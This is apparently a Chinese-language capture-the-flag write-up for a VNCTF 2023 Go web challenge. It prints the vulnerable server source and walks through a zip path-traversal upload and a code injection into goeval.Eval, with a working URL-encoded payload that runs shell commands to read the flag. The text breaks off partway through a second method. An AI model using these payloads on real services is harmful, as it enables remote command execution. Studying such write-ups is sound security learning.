+<h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">	r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		session.Set(<span class="string">&quot;shallow&quot;</span>, userDir)</span><br><span class="line">		session.Save()</span><br><span class="line">		fileutil.CreateDir(userDir)</span><br><span class="line">		gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">		user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">		encoder := gob.NewEncoder(gobFile)</span><br><span class="line">		encoder.Encode(user)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		fileutil.CreateDir(userUploadDir)</span><br><span class="line">		file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">		<span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		filename := userUploadDir + file.Filename</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">			fileutil.RemoveFile(filename)</span><br><span class="line">		&#125;</span><br><span class="line">		err = c.SaveUploadedFile(file, filename)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">		destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">		<span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">			<span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">				err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">				fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">			decoder := gob.NewDecoder(file)</span><br><span class="line">			<span class="keyword">var</span> ctfer User</span><br><span class="line">			decoder.Decode(&amp;ctfer)</span><br><span class="line">			<span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">				eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">				&#125;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总体来说不是太难理解</p>
+<p><code>/</code>路由，生成一个<code>userDir</code>并保存在<code>Session</code>里，后面的部分都会从Session取这个的值进行操作<br>并且还会创建一个<code>user.gob</code>文件，将User信息保存在里面</p>
+<p><code>/upload</code>路由，将文件上传到userDir+”uploads&#x2F;“目录，并且会检测文件后缀</p>
+<p><code>/unzip</code>路由，会对userDir+”uploads&#x2F;“目录里的zip文件进行解压，且目的路径可控，接受GET传参的path的值</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>然后来看看这个<code>filepath.Clean</code>是什么东西</p>
+<blockquote>
+<p>Clean通过纯词法处理返回与path相当的最短路径名称。它反复应用以下规则，直到不能再做进一步处理。</p>
+<ol>
+<li><p>用一个元素替换多个Separator元素。</p>
+</li>
+<li><p>消除每个.路径名元素（当前目录）。</p>
+</li>
+<li><p>消除每个内部的..路径名称元素（父目录）和它前面的非..元素。</p>
+</li>
+<li><p>消除了将..放在根路径后面的情况（’&#x2F;..’)：也就是说，假设Separator是’&#x2F;‘，在一个路径的开头用”&#x2F;“替换”&#x2F;..”。</p>
+</li>
+<li><p>返回的路径只有在代表根目录时才以斜线结尾，例如Unix系统中的”&#x2F;“或Windows系统中的<code>C:</code></p>
+</li>
+</ol>
+<p>最后，任何出现的斜线都被Separator替换。</p>
+<p>如果这个过程的结果是一个空字符串，Clean返回字符串”.”。</p>
+<p>from <a target="_blank" rel="noopener" href="https://pkg.go.dev/path/filepath#Clean">https://pkg.go.dev/path/filepath#Clean</a></p>
+</blockquote>
+<p>所以我们可以构造路径，将文件解压到任何我们可以解压的地方</p>
+<p><code>/backdoor</code>路由，会从userDir目录读取<code>user.gob</code>文件的内容，并检测<code>Power</code>键的值是否为”admin”，如果为True，就执行</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>并返回执行结果</p>
+<p>所以可以在本地构造一个user.gob，将<code>Power</code>的值改为”admin”并将其压缩，然后上传并解压到userDir目标覆盖原来的user.gob，这样就可以成功执行到<code>goeval.Eval()</code>了</p>
+<p>而在<code>goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</code>里可以发现并没有可以直接执行任意代码的地方，可控的只有第三个参数</p>
+<p><code>goeval.Eval()</code>的第三参数可以进行包的导入，因为通过报错可以执行题目环境GO的src目录，所以我最开始想的是在fmt包里导入一个函数<code>Println</code>，这样在执行<code>goeval.Eval()</code>的时候就可以执行我们自己构造的代码。</p>
+<p>但是我想少了，如果直接将pkg传参为fmt的话，因为在Println()被fmt包里的其他文件被定义过，所以我这再定义一个就会报错</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191556105.png" title="image-20230219155657021" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191556105.png" alt="image-20230219155657021"></a></p>
+<p>然后我就随手搜了一下goeval.Eval，就发现了可以对goeval.Eval进行代码注入，从而远程执行代码</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191557626.png" title="image-20230219155756587" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191557626.png" alt="image-20230219155756587"></a></p>
+<p>根据这篇文件去看看goeval.Eval的<a target="_blank" rel="noopener" href="https://github.com/PaulXu-cn/goeval/blob/v0.1.1/eval.go#L44">源码</a></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(defineCode <span class="type">string</span>, code <span class="type">string</span>, imports ...<span class="type">string</span>)</span></span> (re []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		tmp = <span class="string">`package main</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">func main() &#123;</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">		importStr <span class="type">string</span></span><br><span class="line">		fullCode <span class="type">string</span></span><br><span class="line">	 	newTmpDir = tempDir + dirSeparator + RandString(<span class="number">8</span>)</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(imports) &#123;</span><br><span class="line">		importStr = <span class="string">&quot;import (&quot;</span></span><br><span class="line">		<span class="keyword">for</span> _, item := <span class="keyword">range</span> imports &#123;</span><br><span class="line">			<span class="keyword">if</span> blankInd := strings.Index(item, <span class="string">&quot; &quot;</span>); <span class="number">-1</span> &lt; blankInd &#123;</span><br><span class="line">				importStr += fmt.Sprintf(<span class="string">&quot;\n %s \&quot;%s\&quot;&quot;</span>, item[:blankInd], item[blankInd+<span class="number">1</span>:])</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				importStr += fmt.Sprintf(<span class="string">&quot;\n\&quot;%s\&quot;&quot;</span>, item)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		importStr += <span class="string">&quot;\n)&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> codeBytes = []<span class="type">byte</span>(fullCode)</span><br><span class="line">	<span class="comment">// 格式化输出的代码</span></span><br><span class="line">	<span class="keyword">if</span> formatCode, err := format.Source(codeBytes); <span class="literal">nil</span> == err &#123;</span><br><span class="line">		<span class="comment">// 格式化失败，就还是用 content 吧</span></span><br><span class="line">		codeBytes = formatCode</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建目录</span></span><br><span class="line">	<span class="keyword">if</span> err = os.Mkdir(newTmpDir, os.ModePerm); <span class="literal">nil</span> != err &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> os.RemoveAll(newTmpDir)</span><br><span class="line">	<span class="comment">// 创建文件</span></span><br><span class="line">	tmpFile, err := os.Create(newTmpDir + dirSeparator + <span class="string">&quot;main.go&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> re, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> os.Remove(tmpFile.Name())</span><br><span class="line">	<span class="comment">// 代码写入文件</span></span><br><span class="line">	tmpFile.Write(codeBytes)</span><br><span class="line">	tmpFile.Close()</span><br><span class="line">	<span class="comment">// 运行代码</span></span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;run&quot;</span>, tmpFile.Name())</span><br><span class="line">	res, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">return</span> res, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，Eval是将代码写入一个临时文件然后运行再返回运行的结果，而且是以拼接的方式来写入代码</p>
+<p>所以可以进行代码注入，用<code>\t</code>替代空格，同时由于他执行的是main内的代码，而且这个是写死的，所以得将要执行的代码写入init()里，这个函数会在main()前执行，然后使用var来闭合最后面的<code>&quot;)</code></p>
+<p>init函数特性</p>
+<blockquote>
+<p>1.init函数可以在所有程序执行开始前被调用，并且每个包下可以有多个init函数<br>2.init函数先于main函数自动执行<br>3.每个包中可以有多个init函数，每个包中的源文件中也可以有多个init函数<br>4.init函数没有输入参数、返回值，也未声明，所以无法引用<br>5.不同包的init函数按照包导入的依赖关系决定执行顺序<br>6.无论包被导入多少次，init函数只会被调用一次，也就是只执行一次<br>7.init函数在代码中不能被显示的调用，不能被引用（赋值给函数变量），否则会出现编译错误<br>8.导入包不要出现循环依赖，这样会导致程序编译失败<br>9.Go程序仅仅想要用一个package的init执行，我们可以这样使用：import _ “test_xxxx”，导入包的时候加上下划线就ok了<br>10.包级别的变量初始化、init函数执行，这两个操作都是在同一个goroutine中调用的，按顺序调用，一次一个包<br>11.init函数不应该依赖任何在main函数里创建的变量，因为init函数的执行是在main函数之前的<br>12.在init函数中也可以启动goroutine，也就是在初始化的同时启动新的goroutine，这并不会影响初始化顺序<br>13.复杂逻辑不建议使用init函数，会增加代码的复杂性，可读性也会下降<br>14.一个源文件下可以有多个init函数，代码比较长时可以考虑分多个init函数<br>15.编程时不要依赖init的顺序</p>
+</blockquote>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg := <span class="string">&quot;os/exec\&quot;\n\&quot;fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;ls\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\nvar(\na=\&quot;1&quot;</span></span><br><span class="line">goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, pkg)</span><br></pre></td></tr></table></figure>
+
+<p>就会执行</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span>	<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">cmd:=exec.Command(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">out,_:=cmd.CombinedOutput()</span><br><span class="line">fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">a=<span class="string">&quot;1&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Good&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-题解"><a href="#0x02-题解" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><h3 id="方法一-代码注入"><a href="#方法一-代码注入" class="headerlink" title="方法一 代码注入"></a>方法一 代码注入</h3><p>先在本地创建一个user.gob文件，就跟源码里的方式一样建一个再压缩</p>
+<p>然后上传文件，再解压缩文件</p>
+<p>解压缩的url为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/unzip?path=../../../../tmp/49c69cef49dc4b3be71e988a20149ca7</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>/backdoor</code>路由，进行代码注入，远程执行命令</p>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/backdoor?pkg=os%2Fexec%22%0A%22fmt%22%0A%29%0A%0Afunc%09init%28%29%7B%0Acmd%3A%3Dexec.Command%28%22cat%22%2C%22%2Fffflllaaaggg%22%29%0Aout%2C_%3A%3Dcmd.CombinedOutput%28%29%0Afmt.Println%28string%28out%29%29%0A%7D%0Avar%28%0Aa%3D%221</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191641018.png" title="image-20230219164136927" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191641018.png" alt="image-20230219164136927"></a></p>
+<h3 id="方法二-使用别名执行自己的包"><a href="#方法二-使用别名执行自己的包" class="headerlink" title="方法二 使用别名执行自己的包"></a>方法二 使用别名执行自己的包</h3><p>这是我在写wp的时候发现的另一个方法</p>
+<p>看一下Eval对第三个参数的区别处理</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> imports &#123;</span><br><span class="line">    <span class="keyword">if</span> blankInd := strings.Index(item, <span class="string">&quot; &quot;</span>); <span class="number">-1</span> &lt; blankInd &#123;</span><br><span class="line">        importStr += fmt.Sprintf(<span class="string">&quot;\n %s \&quot;%s\&quot;&quot;</span>, item[:blankInd], item[blankInd+<span class="number">1</span>:])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        importStr += fmt.Sprintf(<span class="string">&quot;\n\&quot;%s\&quot;&quot;</span>, item)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>eg:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, <span class="string">&quot;fmt os/exec&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>就会变成</p>
